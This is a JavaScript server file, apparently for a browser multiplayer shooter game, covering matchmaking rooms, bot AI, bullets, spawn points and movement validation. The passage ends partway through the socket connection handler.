const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.static(path.join(__dirname)));
app.use(express.json());

// Serve the game files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Game state management
class GameRoom {
    constructor(id) {
        this.id = id;
        this.players = new Map();
        this.bots = new Map();
        this.gameState = 'waiting'; // waiting, playing, finished
        this.maxPlayers = 6;
        this.gameStartTime = null;
        this.matchmakingTimer = null;
        this.gameLength = 60000; // 1 minute
        this.bullets = [];
        this.mapWidth = 1200;
        this.mapHeight = 800;
        this.botUpdateInterval = null;
        this.lastBotUpdate = 0;
        this.botNames = [
            'Agent_Alpha', 'Shadow_Ops', 'Steel_Wolf', 'Ghost_Recon', 'Viper_Strike',
            'Phoenix_Rising', 'Thunder_Bolt', 'Razor_Edge', 'Night_Hunter', 'Storm_Breaker',
            'Cyber_Ninja', 'Iron_Hawk', 'Frost_Bite', 'Blaze_Runner', 'Silent_Death'
        ];
        this.usedBotNames = new Set();
    }

    addPlayer(socket, playerData) {
        if (this.players.size >= this.maxPlayers) {
            return false;
        }

        const spawnPoint = this.getRandomSpawnPoint();
        const player = {
            id: socket.id,
            socket: socket,
            name: playerData.name,
            x: spawnPoint.x,
            y: spawnPoint.y,
            vx: 0,
            vy: 0,
            health: 100,
            maxHealth: 100,
            ammo: 30,
            maxAmmo: 30,
            reserveAmmo: 120,
            kills: 0,
            deaths: 0,
            score: 0,
            angle: 0,
            joinTime: Date.now(),
            lastUpdate: Date.now()
        };

        this.players.set(socket.id, player);
        socket.join(this.id);
        
        // Start matchmaking timer if this is the first player
        if (this.players.size === 1) {
            this.startMatchmakingTimer();
        }

        // Auto-start game if room is full
        if (this.players.size >= this.maxPlayers) {
            this.startGame();
        }

        return true;
    }

    removePlayer(socketId) {
        const player = this.players.get(socketId);
        if (player) {
            this.players.delete(socketId);
            
            // End game if not enough players during gameplay
            if (this.gameState === 'playing' && this.players.size < 2) {
                this.endGame();
            }
            
            // Cancel matchmaking if no players left
            if (this.players.size === 0 && this.matchmakingTimer) {
                clearTimeout(this.matchmakingTimer);
                this.matchmakingTimer = null;
            }
        }
    }

    startMatchmakingTimer() {
        this.matchmakingTimer = setTimeout(() => {
            if (this.gameState === 'waiting' && this.players.size >= 1) {
                this.fillWithBots();
                this.startGame();
            }
        }, 30000); // 30 seconds timeout
    }

    startGame() {
        if (this.gameState !== 'waiting') return;

        // Fill with bots if needed before starting
        this.fillWithBots();

        this.gameState = 'playing';
        this.gameStartTime = Date.now();
        
        // Clear matchmaking timer
        if (this.matchmakingTimer) {
            clearTimeout(this.matchmakingTimer);
            this.matchmakingTimer = null;
        }

        // Notify all players in room
        io.to(this.id).emit('gameStart', {
            players: this.getPlayersData(),
            roomId: this.id
        });

        console.log(`Game started in room ${this.id} with ${this.players.size + this.bots.size} players (${this.players.size} human, ${this.bots.size} bots)`);

        // Start position sync interval for real-time updates
        this.positionSyncInterval = setInterval(() => {
            if (this.gameState === 'playing') {
                this.updateBots();
                this.broadcastPlayerPositions();
                this.updateServerBullets();
            }
        }, 33); // ~30 FPS server-side position sync
        
        // Start periodic full player list sync to ensure all clients have all players
        this.playerListSyncInterval = setInterval(() => {
            if (this.gameState === 'playing' && (this.players.size > 0 || this.bots.size > 0)) {
                io.to(this.id).emit('playersUpdate', {
                    playersCount: this.players.size + this.bots.size,
                    players: this.getPlayersData()
                });
            }
        }, 1000); // Every 1 second

        // Set game end timer
        setTimeout(() => {
            this.endGame();
        }, this.gameLength);
    }

    endGame() {
        if (this.gameState !== 'playing') return;

        this.gameState = 'finished';
        
        // Clear position sync interval
        if (this.positionSyncInterval) {
            clearInterval(this.positionSyncInterval);
            this.positionSyncInterval = null;
        }
        
        // Clear player list sync interval
        if (this.playerListSyncInterval) {
            clearInterval(this.playerListSyncInterval);
            this.playerListSyncInterval = null;
        }
        
        const finalStats = Array.from(this.players.values())
            .sort((a, b) => b.score - a.score)
            .map(player => ({
                name: player.name,
                kills: player.kills,
                deaths: player.deaths,
                score: player.score
            }));

        io.to(this.id).emit('gameEnd', { finalStats });
        
        console.log(`Game ended in room ${this.id}`);

        // Clean up room after 30 seconds
        setTimeout(() => {
            this.cleanup();
        }, 30000);
    }

    cleanup() {
        // Clear position sync interval
        if (this.positionSyncInterval) {
            clearInterval(this.positionSyncInterval);
            this.positionSyncInterval = null;
        }
        
        // Clear player list sync interval
        if (this.playerListSyncInterval) {
            clearInterval(this.playerListSyncInterval);
            this.playerListSyncInterval = null;
        }
        
        // Remove all players from room
        this.players.forEach(player => {
            player.socket.leave(this.id);
        });
        this.players.clear();
        
        // Clear bots
        this.bots.clear();
        this.usedBotNames.clear();
        
        // Remove room from rooms map
        rooms.delete(this.id);
        console.log(`Room ${this.id} cleaned up`);
    }

    fillWithBots() {
        const totalPlayersNeeded = Math.max(6, this.players.size + 1);
        const botsToAdd = totalPlayersNeeded - this.players.size;
        
        console.log(`Room ${this.id}: Adding ${botsToAdd} bots to reach ${totalPlayersNeeded} total players`);
        
        for (let i = 0; i < botsToAdd; i++) {
            this.createBot();
        }
    }

    createBot() {
        const botName = this.getUniqueBotName();
        const spawnPoint = this.getRandomSpawnPoint();
        const difficulty = this.getRandomDifficulty();
        
        const botId = 'bot_' + Math.random().toString(36).substr(2, 9);
        
        const bot = {
            id: botId,
            name: botName,
            x: spawnPoint.x,
            y: spawnPoint.y,
            vx: 0,
            vy: 0,
            health: 100,
            maxHealth: 100,
            ammo: 30,
            maxAmmo: 30,
            reserveAmmo: 120,
            kills: 0,
            deaths: 0,
            score: 0,
            angle: Math.random() * Math.PI * 2,
            isBot: true,
            difficulty: difficulty,
            lastUpdate: Date.now(),
            
            // AI State
            aiState: 'patrol',
            currentTarget: null,
            lastSeen: null,
            waypoints: this.generateBotWaypoints(),
            currentWaypoint: 0,
            lastShot: 0,
            lastReload: 0,
            stuckCounter: 0,
            lastPosition: { x: spawnPoint.x, y: spawnPoint.y }
        };
        
        this.bots.set(botId, bot);
        return bot;
    }

    getUniqueBotName() {
        const availableNames = this.botNames.filter(name => !this.usedBotNames.has(name));
        
        if (availableNames.length === 0) {
            // If all names are used, generate a unique name with suffix
            const baseName = this.botNames[Math.floor(Math.random() * this.botNames.length)];
            const suffix = Math.floor(Math.random() * 999);
            return `${baseName}_${suffix}`;
        }
        
        const selectedName = availableNames[Math.floor(Math.random() * availableNames.length)];
        this.usedBotNames.add(selectedName);
        return selectedName;
    }

    getRandomDifficulty() {
        const difficulties = ['easy', 'medium', 'hard'];
        const weights = [0.3, 0.5, 0.2]; // 30% easy, 50% medium, 20% hard
        
        const random = Math.random();
        let cumulative = 0;
        
        for (let i = 0; i < difficulties.length; i++) {
            cumulative += weights[i];
            if (random <= cumulative) {
                return difficulties[i];
            }
        }
        
        return 'medium';
    }

    generateBotWaypoints() {
        const waypoints = [];
        const numWaypoints = 3 + Math.floor(Math.random() * 3);
        
        for (let i = 0; i < numWaypoints; i++) {
            waypoints.push({
                x: 50 + Math.random() * (this.mapWidth - 100),
                y: 50 + Math.random() * (this.mapHeight - 100)
            });
        }
        
        return waypoints;
    }

    updateBots() {
        const now = Date.now();
        if (now - this.lastBotUpdate < 50) return; // Update at 20fps
        this.lastBotUpdate = now;

        const allPlayers = [...this.players.values(), ...this.bots.values()];
        const obstacles = this.getObstacles();

        this.bots.forEach(bot => {
            this.updateBotAI(bot, allPlayers, obstacles);
            this.updateBotPosition(bot, obstacles, allPlayers);
            this.checkBotShooting(bot, allPlayers, obstacles);
            
            // Broadcast bot movement
            io.to(this.id).emit('playerMoved', {
                playerId: bot.id,
                x: bot.x,
                y: bot.y,
                angle: bot.angle,
                vx: bot.vx,
                vy: bot.vy,
                timestamp: now
            });
        });
    }

    updateBotAI(bot, allPlayers, obstacles) {
        const enemies = allPlayers.filter(p => p.id !== bot.id && p.health > 0);
        const nearestEnemy = this.findNearestEnemy(bot, enemies);
        
        // State machine
        switch (bot.aiState) {
            case 'patrol':
                if (nearestEnemy && this.getDistance(bot, nearestEnemy) < 200) {
                    bot.aiState = 'hunt';
                    bot.currentTarget = nearestEnemy;
                } else {
                    this.botPatrol(bot);
                }
                break;
                
            case 'hunt':
                if (!nearestEnemy || this.getDistance(bot, nearestEnemy) > 300) {
                    bot.aiState = 'patrol';
                    bot.currentTarget = null;
                } else if (this.getDistance(bot, nearestEnemy) < 120) {
                    bot.aiState = 'combat';
                }
                if (bot.currentTarget) {
                    this.botMoveToward(bot, bot.currentTarget.x, bot.currentTarget.y);
                    bot.angle = Math.atan2(bot.currentTarget.y - bot.y, bot.currentTarget.x - bot.x);
                }
                break;
                
            case 'combat':
                if (!nearestEnemy || this.getDistance(bot, nearestEnemy) > 180) {
                    bot.aiState = 'hunt';
                } else if (bot.health < 30) {
                    bot.aiState = 'flee';
                }
                if (bot.currentTarget) {
                    this.botCombatMovement(bot, bot.currentTarget);
                    bot.angle = Math.atan2(bot.currentTarget.y - bot.y, bot.currentTarget.x - bot.x);
                }
                break;
                
            case 'flee':
                if (bot.health > 60 || !nearestEnemy || this.getDistance(bot, nearestEnemy) > 250) {
                    bot.aiState = 'patrol';
                    bot.currentTarget = null;
                } else {
                    this.botFlee(bot, nearestEnemy);
                }
                break;
        }

        // Auto-reload logic
        if (bot.ammo <= 5 && bot.reserveAmmo > 0 && Date.now() - bot.lastReload > 3000) {
            this.botReload(bot);
        }
    }

    updateBotPosition(bot, obstacles, allPlayers) {
        // Store current position for collision resolution
        const oldX = bot.x;
        const oldY = bot.y;
        
        // Apply movement
        const newX = bot.x + bot.vx;
        const newY = bot.y + bot.vy;
        
        // Check for obstacle collisions
        const botSize = 20;
        
        // Check X movement
        let canMoveX = true;
        for (let obstacle of obstacles) {
            if (this.checkRectangleCollision(
                newX - botSize, bot.y - botSize, botSize * 2, botSize * 2,
                obstacle.x, obstacle.y, obstacle.width, obstacle.height
            )) {
                canMoveX = false;
                bot.vx = 0; // Stop horizontal movement
                break;
            }
        }
        
        // Check Y movement
        let canMoveY = true;
        for (let obstacle of obstacles) {
            if (this.checkRectangleCollision(
                bot.x - botSize, newY - botSize, botSize * 2, botSize * 2,
                obstacle.x, obstacle.y, obstacle.width, obstacle.height
            )) {
                canMoveY = false;
                bot.vy = 0; // Stop vertical movement
                break;
            }
        }
        
        // Apply movement if no collision
        if (canMoveX) {
            bot.x = newX;
        }
        if (canMoveY) {
            bot.y = newY;
        }
        
        // Check collision with other players/bots for avoidance
        for (let entity of allPlayers) {
            if (entity.id !== bot.id) {
                const distance = this.getDistance(bot, entity);
                if (distance < 40) {
                    // Push away from other entity
                    const pushAngle = Math.atan2(bot.y - entity.y, bot.x - entity.x);
                    const pushForce = (40 - distance) / 40;
                    bot.vx += Math.cos(pushAngle) * pushForce * 0.5;
                    bot.vy += Math.sin(pushAngle) * pushForce * 0.5;
                }
            }
        }
        
        // Apply friction
        bot.vx *= 0.85;
        bot.vy *= 0.85;
        
        // Stop small movements
        if (Math.abs(bot.vx) < 0.1) bot.vx = 0;
        if (Math.abs(bot.vy) < 0.1) bot.vy = 0;
        
        // Keep in bounds
        bot.x = Math.max(botSize, Math.min(this.mapWidth - botSize, bot.x));
        bot.y = Math.max(botSize, Math.min(this.mapHeight - botSize, bot.y));
        
        // Check if stuck and handle collision response
        const moved = Math.sqrt(Math.pow(bot.x - bot.lastPosition.x, 2) + Math.pow(bot.y - bot.lastPosition.y, 2));
        if (moved < 2 && (Math.abs(bot.vx) > 0.1 || Math.abs(bot.vy) > 0.1)) {
            bot.stuckCounter++;
            if (bot.stuckCounter > 30) {
                // Collision response: Try to move around obstacle
                const randomAngle = Math.random() * Math.PI * 2;
                bot.vx += Math.cos(randomAngle) * 1.5;
                bot.vy += Math.sin(randomAngle) * 1.5;
                
                // Generate new waypoints to get unstuck
                bot.waypoints = this.generateBotWaypoints();
                bot.currentWaypoint = 0;
                bot.stuckCounter = 0;
            }
        } else {
            bot.stuckCounter = 0;
        }
        
        bot.lastPosition = { x: bot.x, y: bot.y };
    }

    findNearestEnemy(bot, enemies) {
        let nearest = null;
        let nearestDistance = Infinity;
        
        enemies.forEach(enemy => {
            const distance = this.getDistance(bot, enemy);
            if (distance < nearestDistance) {
                nearest = enemy;
                nearestDistance = distance;
            }
        });
        
        return nearest;
    }

    getDistance(obj1, obj2) {
        return Math.sqrt(Math.pow(obj1.x - obj2.x, 2) + Math.pow(obj1.y - obj2.y, 2));
    }

    botPatrol(bot) {
        if (bot.waypoints.length === 0) return;
        
        const target = bot.waypoints[bot.currentWaypoint];
        const distance = this.getDistance(bot, target);
        
        if (distance < 30) {
            bot.currentWaypoint = (bot.currentWaypoint + 1) % bot.waypoints.length;
        } else {
            this.botMoveToward(bot, target.x, target.y, 0.4);
        }
    }

    botMoveToward(bot, targetX, targetY, speed = 0.6) {
        const dx = targetX - bot.x;
        const dy = targetY - bot.y;
        const distance = Math.sqrt(dx * dx + dy * dy);
        
        if (distance > 0) {
            bot.vx += (dx / distance) * speed * 2;
            bot.vy += (dy / distance) * speed * 2;
        }
    }

    botCombatMovement(bot, enemy) {
        const distance = this.getDistance(bot, enemy);
        
        // Strafe movement
        const perpAngle = Math.atan2(enemy.y - bot.y, enemy.x - bot.x) + Math.PI / 2;
        const strafeDirection = Math.sin(Date.now() * 0.003) > 0 ? 1 : -1;
        
        const strafeX = bot.x + Math.cos(perpAngle) * strafeDirection * 30;
        const strafeY = bot.y + Math.sin(perpAngle) * strafeDirection * 30;
        
        // Combine approach and strafe
        if (distance > 80) {
            this.botMoveToward(bot, enemy.x, enemy.y, 0.3);
        } else if (distance < 50) {
            this.botMoveToward(bot, enemy.x, enemy.y, -0.2); // Back away
        }
        
        this.botMoveToward(bot, strafeX, strafeY, 0.4);
    }

    botFlee(bot, enemy) {
        const fleeAngle = Math.atan2(bot.y - enemy.y, bot.x - enemy.x);
        const fleeX = bot.x + Math.cos(fleeAngle) * 100;
        const fleeY = bot.y + Math.sin(fleeAngle) * 100;
        
        this.botMoveToward(bot, fleeX, fleeY, 0.8);
    }

    checkBotShooting(bot, allPlayers, obstacles) {
        if (!bot.currentTarget || bot.ammo <= 0 || Date.now() - bot.lastShot < this.getBotFireRate(bot)) {
            return;
        }

        const distance = this.getDistance(bot, bot.currentTarget);
        if (distance > 150 || !this.canBotSeeTarget(bot, bot.currentTarget, obstacles)) {
            return;
        }

        // Add some accuracy based on difficulty
        let accuracy = 0.7;
        switch (bot.difficulty) {
            case 'easy': accuracy = 0.5; break;
            case 'medium': accuracy = 0.7; break;
            case 'hard': accuracy = 0.85; break;
        }

        if (Math.random() < accuracy) {
            this.botShoot(bot);
        }
    }

    getBotFireRate(bot) {
        switch (bot.difficulty) {
            case 'easy': return 300 + Math.random() * 300;
            case 'medium': return 200 + Math.random() * 200;
            case 'hard': return 150 + Math.random() * 150;
            default: return 250;
        }
    }

    canBotSeeTarget(bot, target, obstacles) {
        // Simple line of sight check
        const steps = 20;
        const dx = (target.x - bot.x) / steps;
        const dy = (target.y - bot.y) / steps;

        for (let i = 1; i <= steps; i++) {
            const checkX = bot.x + dx * i;
            const checkY = bot.y + dy * i;

            for (let obstacle of obstacles) {
                if (this.checkPointInRectangle(checkX, checkY, obstacle.x, obstacle.y, obstacle.width, obstacle.height)) {
                    return false;
                }
            }
        }

        return true;
    }

    checkPointInRectangle(pointX, pointY, rectX, rectY, rectWidth, rectHeight) {
        return pointX >= rectX && 
               pointX <= rectX + rectWidth && 
               pointY >= rectY && 
               pointY <= rectY + rectHeight;
    }

    botShoot(bot) {
        if (bot.ammo <= 0) return;

        bot.ammo--;
        bot.lastShot = Date.now();

        // Create bullet
        const bulletSpeed = 8;
        const bullet = {
            id: 'bullet_' + Math.random().toString(36).substr(2, 9),
            x: bot.x,
            y: bot.y,
            vx: Math.cos(bot.angle) * bulletSpeed,
            vy: Math.sin(bot.angle) * bulletSpeed,
            ownerId: bot.id,
            damage: 25,
            life: 1000
        };

        this.bullets.push(bullet);

        // Broadcast bullet to all players
        io.to(this.id).emit('bulletFired', bullet);

        // Broadcast ammo update
        io.to(this.id).emit('playerAmmoUpdate', {
            playerId: bot.id,
            ammo: bot.ammo,
            reserveAmmo: bot.reserveAmmo
        });
    }

    botReload(bot) {
        if (bot.reserveAmmo <= 0) return;

        const ammoNeeded = bot.maxAmmo - bot.ammo;
        const ammoToReload = Math.min(ammoNeeded, bot.reserveAmmo);

        bot.ammo += ammoToReload;
        bot.reserveAmmo -= ammoToReload;
        bot.lastReload = Date.now();

        // Broadcast ammo update
        io.to(this.id).emit('playerAmmoUpdate', {
            playerId: bot.id,
            ammo: bot.ammo,
            reserveAmmo: bot.reserveAmmo
        });
    }
    
    broadcastPlayerPositions() {
        // Broadcast current positions and full data of all players to ensure synchronization
        const playerPositions = Array.from(this.players.values()).map(player => ({
            id: player.id,
            name: player.name,
            x: player.x,
            y: player.y,
            vx: player.vx || 0,
            vy: player.vy || 0,
            angle: player.angle,
            health: player.health,
            ammo: player.ammo,
            reserveAmmo: player.reserveAmmo,
            kills: player.kills,
            deaths: player.deaths,
            score: player.score,
            timestamp: Date.now(),
            isBot: false
        }));

        const botPositions = Array.from(this.bots.values()).map(bot => ({
            id: bot.id,
            name: bot.name,
            x: bot.x,
            y: bot.y,
            vx: bot.vx || 0,
            vy: bot.vy || 0,
            angle: bot.angle,
            health: bot.health,
            ammo: bot.ammo,
            reserveAmmo: bot.reserveAmmo,
            kills: bot.kills,
            deaths: bot.deaths,
            score: bot.score,
            timestamp: Date.now(),
            isBot: true
        }));

        const allPositions = [...playerPositions, ...botPositions];
        
        if (allPositions.length > 0) {
            io.to(this.id).emit('playersPositionSync', { players: allPositions });
        }
    }
    
    updateServerBullets() {
        const now = Date.now();
        
        // Update bullet positions and check collisions
        this.bullets = this.bullets.filter(bullet => {
            // Update bullet position
            bullet.x += bullet.vx;
            bullet.y += bullet.vy;
            bullet.life -= 33; // Decrease life by update interval
            
            // Remove expired or out-of-bounds bullets
            if (bullet.life <= 0 || 
                bullet.x < 0 || bullet.x > this.mapWidth ||
                bullet.y < 0 || bullet.y > this.mapHeight) {
                return false;
            }
            
            // Check collision with obstacles
            const obstacles = this.getObstacles();
            for (let obstacle of obstacles) {
                if (bullet.x >= obstacle.x && bullet.x <= obstacle.x + obstacle.width &&
                    bullet.y >= obstacle.y && bullet.y <= obstacle.y + obstacle.height) {
                    return false; // Remove bullet
                }
            }
            
            return true; // Keep bullet
        });
    }

    getRandomSpawnPoint() {
        // Define safe spawn areas that are guaranteed to be clear of obstacles
        const safeSpawnPoints = [
            // Top area spawns
            { x: 80, y: 80 },
            { x: 250, y: 50 },
            { x: 450, y: 80 },
            { x: 750, y: 50 },
            { x: 950, y: 80 },
            { x: 1120, y: 80 },
            
            // Middle area spawns  
            { x: 50, y: 250 },
            { x: 350, y: 350 },
            { x: 650, y: 400 },
            { x: 950, y: 350 },
            { x: 1150, y: 250 },
            
            // Bottom area spawns
            { x: 80, y: 720 },
            { x: 250, y: 750 },
            { x: 450, y: 720 },
            { x: 750, y: 750 },
            { x: 950, y: 720 },
            { x: 1120, y: 720 },
            
            // Open field spawns
            { x: 200, y: 400 },
            { x: 400, y: 500 },
            { x: 800, y: 200 },
            { x: 1000, y: 600 },
            { x: 300, y: 650 },
            { x: 700, y: 450 }
        ];
        
        // Try multiple spawn points to find a clear one
        for (let attempts = 0; attempts < 10; attempts++) {
            const spawnPoint = safeSpawnPoints[Math.floor(Math.random() * safeSpawnPoints.length)];
            
            // Verify the spawn point is clear
            if (this.isSpawnPointClear(spawnPoint)) {
                return spawnPoint;
            }
        }
        
        // Fallback to corner if all attempts fail
        return { x: 80, y: 80 };
    }
    
    isSpawnPointClear(spawnPoint) {
        const playerSize = 25; // Player collision radius
        const safetyMargin = 15; // Extra margin for safety
        const obstacles = this.getObstacles();
        
        // Check if spawn point conflicts with any obstacle (with safety margin)
        for (let obstacle of obstacles) {
            if (this.checkRectangleCollision(
                spawnPoint.x - playerSize - safetyMargin,
                spawnPoint.y - playerSize - safetyMargin,
                (playerSize + safetyMargin) * 2,
                (playerSize + safetyMargin) * 2,
                obstacle.x,
                obstacle.y,
                obstacle.width,
                obstacle.height
            )) {
                return false; // Spawn point is blocked
            }
        }
        
        // Check if spawn point conflicts with existing players
        for (let [playerId, player] of this.players) {
            const distance = Math.sqrt(
                Math.pow(spawnPoint.x - player.x, 2) + 
                Math.pow(spawnPoint.y - player.y, 2)
            );
            if (distance < 80) { // Minimum distance between players
                return false;
            }
        }
        
        // Check if spawn point is within map bounds
        if (spawnPoint.x - playerSize < 0 || 
            spawnPoint.x + playerSize > this.mapWidth ||
            spawnPoint.y - playerSize < 0 || 
            spawnPoint.y + playerSize > this.mapHeight) {
            return false;
        }
        
        return true;
    }
    
    checkRectangleCollision(x1, y1, w1, h1, x2, y2, w2, h2) {
        return x1 < x2 + w2 &&
               x1 + w1 > x2 &&
               y1 < y2 + h2 &&
               y1 + h1 > y2;
    }
    
    checkPlayerObstacleCollision(player) {
        const obstacles = this.getObstacles();
        const playerSize = 25;
        
        for (let obstacle of obstacles) {
            if (this.checkRectangleCollision(
                player.x - playerSize,
                player.y - playerSize,
                playerSize * 2,
                playerSize * 2,
                obstacle.x,
                obstacle.y,
                obstacle.width,
                obstacle.height
            )) {
                return true;
            }
        }
        return false;
    }
    
    getObstacles() {
        // Return the same obstacles as defined in the client-side game
        return [
            // Central building complex
            { x: 500, y: 300, width: 120, height: 80 },
            { x: 550, y: 250, width: 80, height: 40 },
            
            // Corner structures
            { x: 100, y: 100, width: 60, height: 60 },
            { x: 1040, y: 100, width: 60, height: 60 },
            { x: 100, y: 640, width: 60, height: 60 },
            { x: 1040, y: 640, width: 60, height: 60 },
            
            // Scattered cover objects
            { x: 300, y: 200, width: 30, height: 30 },
            { x: 800, y: 300, width: 30, height: 30 },
            { x: 200, y: 500, width: 30, height: 30 },
            { x: 900, y: 500, width: 30, height: 30 },
            
            // Walls for cover
            { x: 400, y: 150, width: 100, height: 20 },
            { x: 700, y: 150, width: 100, height: 20 },
            { x: 400, y: 600, width: 100, height: 20 },
            { x: 700, y: 600, width: 100, height: 20 },
            
            // Trees
            { x: 250, y: 350, width: 25, height: 25 },
            { x: 950, y: 200, width: 25, height: 25 },
            { x: 150, y: 300, width: 25, height: 25 },
            { x: 850, y: 450, width: 25, height: 25 }
        ];
    }

    getPlayersData() {
        const players = Array.from(this.players.values()).map(player => ({
            id: player.id,
            name: player.name,
            x: player.x,
            y: player.y,
            vx: player.vx || 0,
            vy: player.vy || 0,
            health: player.health,
            ammo: player.ammo,
            reserveAmmo: player.reserveAmmo,
            kills: player.kills,
            deaths: player.deaths,
            score: player.score,
            angle: player.angle,
            isBot: false
        }));

        const bots = Array.from(this.bots.values()).map(bot => ({
            id: bot.id,
            name: bot.name,
            x: bot.x,
            y: bot.y,
            vx: bot.vx || 0,
            vy: bot.vy || 0,
            health: bot.health,
            ammo: bot.ammo,
            reserveAmmo: bot.reserveAmmo,
            kills: bot.kills,
            deaths: bot.deaths,
            score: bot.score,
            angle: bot.angle,
            isBot: true
        }));

        return [...players, ...bots];
    }

    updatePlayer(socketId, data) {
        const player = this.players.get(socketId);
        if (player && this.gameState === 'playing') {
            const newX = data.x;
            const newY = data.y;
            const newAngle = data.angle;
            const newVx = data.vx || 0;
            const newVy = data.vy || 0;
            
            // Validate movement (check for obstacles and boundaries)
            if (this.isValidPlayerPosition(newX, newY)) {
                // Check if movement is reasonable (anti-cheat)
                const distance = Math.sqrt(
                    Math.pow(newX - player.x, 2) + 
                    Math.pow(newY - player.y, 2)
                );
                
                // Allow reasonable movement speed (increased for 60fps updates)
                const maxDistance = 15; // Reduced since we're sending updates more frequently
                
                if (distance <= maxDistance) {
                    player.x = newX;
                    player.y = newY;
                    if (newAngle !== undefined) player.angle = newAngle;
                    player.vx = newVx;
                    player.vy = newVy;
                    player.lastUpdate = Date.now();
                    return true;
                } else {
                    // Movement too fast, likely cheating
                    console.log(`Player ${socketId} attempted invalid movement: distance ${distance}`);
                    return false;
                }
            } else {
                // Invalid position (obstacle or out of bounds)
                console.log(`Player ${socketId} attempted invalid position: (${newX}, ${newY})`);
                return false;
            }
        }
        return false;
    }
    
    isValidPlayerPosition(x, y) {
        const playerSize = 25;
        
        // Check map boundaries
        if (x - playerSize < 0 || 
            x + playerSize > this.mapWidth ||
            y - playerSize < 0 || 
            y + playerSize > this.mapHeight) {
            return false;
        }
        
        // Check obstacle collision
        const obstacles = this.getObstacles();
        for (let obstacle of obstacles) {
            if (this.checkRectangleCollision(
                x - playerSize,
                y - playerSize,
                playerSize * 2,
                playerSize * 2,
                obstacle.x,
                obstacle.y,
                obstacle.width,
                obstacle.height
            )) {
                return false;
            }
        }
        
        return true;
    }

    handlePlayerShoot(socketId) {
        const player = this.players.get(socketId);
        if (!player || this.gameState !== 'playing' || player.health <= 0) return null;

        if (player.ammo <= 0) return null;

        player.ammo--;
        
        const bullet = {
            id: Date.now() + Math.random(),
            x: player.x + Math.cos(player.angle) * 25,
            y: player.y + Math.sin(player.angle) * 25,
            vx: Math.cos(player.angle) * 15,
            vy: Math.sin(player.angle) * 15,
            ownerId: socketId,
            ownerName: player.name,
            angle: player.angle,
            damage: 25,
            life: 1000,
            timestamp: Date.now()
        };

        this.bullets.push(bullet);
        
        // Broadcast bullet to all players in room (including the shooter for confirmation)
        io.to(this.id).emit('bulletFired', bullet);

        return bullet;
    }

    handlePlayerReload(socketId) {
        const player = this.players.get(socketId);
        if (!player || this.gameState !== 'playing' || player.health <= 0) return false;

        if (player.reserveAmmo <= 0 || player.ammo >= player.maxAmmo) return false;

        const ammoNeeded = player.maxAmmo - player.ammo;
        const ammoToReload = Math.min(ammoNeeded, player.reserveAmmo);
        
        player.ammo += ammoToReload;
        player.reserveAmmo -= ammoToReload;

        return true;
    }
}

// Store all game rooms
const rooms = new Map();
let roomCounter = 1;

// Find or create available room
function findAvailableRoom() {
    // Look for existing room with space
    for (let room of rooms.values()) {
        if (room.gameState === 'waiting' && room.players.size < room.maxPlayers) {
            return room;
        }
    }
    
    // Create new room if none available
    const roomId = `room_${roomCounter++}`;
    const newRoom = new GameRoom(roomId);
    rooms.set(roomId, newRoom);
    console.log(`Created new room: ${roomId}`);
    return newRoom;
}

// Helper function to ensure unique player names across all rooms
function ensureUniquePlayerName(requestedName) {
    const allPlayerNames = new Set();
    
    // Collect all player names from all active rooms
    rooms.forEach(room => {
        room.players.forEach(player => {
            allPlayerNames.add(player.name);
        });
    });
    
    // If name doesn't already have a unique ID format, or if it conflicts, generate new one
    if (!requestedName.includes('#') || allPlayerNames.has(requestedName)) {
        // Extract base name (remove any existing # suffix)
        const baseName = requestedName.split('#')[0];
        
        // Generate unique identifier
        const timestamp = Date.now().toString().slice(-6);
        const random = Math.floor(Math.random() * 999).toString().padStart(3, '0');
        const uniqueId = `${timestamp}${random}`;
        
        let uniqueName = `${baseName}#${uniqueId}`;
        
        // Double-check uniqueness (very rare case of collision)
        let attempts = 0;
        while (allPlayerNames.has(uniqueName) && attempts < 10) {
            const newRandom = Math.floor(Math.random() * 999).toString().padStart(3, '0');
            uniqueName = `${baseName}#${timestamp}${newRandom}`;
            attempts++;
        }
        
        return uniqueName;
    }
    
    // If name already has unique format and doesn't conflict, keep it
    return requestedName;
}

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log(`Player connected: ${socket.id}`);
    
    let currentRoom = null;

    // Handle player joining matchmaking
    socket.on('joinMatchmaking', (playerData) => {
        console.log(`${playerData.name} (${socket.id}) joining matchmaking`);
        
        // Ensure name uniqueness across all rooms
        const uniqueName = ensureUniquePlayerName(playerData.name);
        playerData.name = uniqueName;
        
        console.log(`Final unique name: ${uniqueName}`);
        
        // Find available room
        const room = findAvailableRoom();
        
        if (room.addPlayer(socket, playerData)) {
            currentRoom = room;
            
            // Send room status to player including current players
            socket.emit('roomJoined', {
                roomId: room.id,
                playersCount: room.players.size,
                maxPlayers: room.maxPlayers,
                gameState: room.gameState,
                players: room.getPlayersData()
            });

            // Broadcast updated player list to all players in room
            io.to(room.id).emit('playersUpdate', {
                playersCount: room.players.size,
                players: room.getPlayersData()
            });

            // Send the new player info to existing players
            const newPlayer = room.players.get(socket.id);
            if (newPlayer) {
                socket.to(room.id).emit('playerJoined', {
                    player: {
                        id: socket.id,
                        name: newPlayer.name,
                        x: newPlayer.x,
                        y: newPlayer.y,
                        vx: newPlayer.vx || 0,
                        vy: newPlayer.vy || 0,
                        health: newPlayer.health,
                        ammo: newPlayer.ammo,
                        reserveAmmo: newPlayer.reserveAmmo,
                        kills: newPlayer.kills,
                        deaths: newPlayer.deaths,
                        score: newPlayer.score,
                        angle: newPlayer.angle
                    }
                });
            }

            console.log(`${playerData.name} joined room ${room.id} (${room.players.size}/${room.maxPlayers})`);
        } else {
            socket.emit('matchmakingError', 'Could not join room');
        }
    });

    // Handle player movement
    socket.on('playerMove', (data) => {
        if (currentRoom) {
            const updateResult = currentRoom.updatePlayer(socket.id, data);
            if (updateResult) {
                // Broadcast movement to other players with velocity data
                socket.to(currentRoom.id).emit('playerMoved', {
                    playerId: socket.id,
                    x: data.x,
                    y: data.y,
                    angle: data.angle,
                    vx: data.vx || 0,
                    vy: data.vy || 0,
                    timestamp: Date.now()
                });
            } else {
                // Movement was rejected, send position correction back to client
                const player = currentRoom.players.get(socket.id);
                if (player) {
                    socket.emit('positionCorrection', {
                        x: player.x,
                        y: player.y,
                        angle: player.angle,
                        vx: player.vx || 0,
                        vy: player.vy || 0
                    });
                }
            }
        }
